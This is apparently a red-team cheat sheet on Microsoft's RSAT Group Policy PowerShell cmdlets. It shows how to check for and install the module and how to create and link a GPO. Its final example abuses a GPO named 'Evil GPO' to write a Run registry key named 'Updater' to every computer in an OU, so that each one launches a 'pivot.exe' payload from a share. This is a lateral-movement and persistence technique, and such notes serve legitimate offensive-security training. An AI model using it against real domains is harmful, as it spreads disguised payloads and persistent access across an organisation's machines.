# Remote Server Administration Tools (RSAT)

> A Microsoft-signed suite of tools for administering Windows systems.

---

## Check if RSAT Group Policy PowerShell Module is Installed

```powershell
Get-Module -List -Name GroupPolicy | select -Expand ExportedCommands
```

---

## Install RSAT Group Policy Module

```powershell
Install-WindowsFeature -Name GPMC
```

---

## Create New GPO and Link to OU

```powershell
New-GPO -Name "$GPO_NAME" | New-GPLink -Target "$DN_OF_OU"
```

- `$DN_OF_OU` is the LDAP distinguished name of the OU
	- Example: `OU=Workstations,DC=dev,DC=cyberbotic,DC=io`

---

## Modify GPO to Write New Key into OU's Computer's Registries

```powershell
Set-GPPrefRegistryValue -Name "$GPO_NAME" -Context Computer -Action Create -Key "$REGISTRY_KEY" -ValueName "$VALUE_NAME" -Value "$VALUE" -Type "$TYPE"
```

Example:

```powershell
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\pivot.exe" -Type ExpandString
```

---

## References

[Microsoft.com](https://www.microsoft.com/en-us/download/details.aspx?id=45520)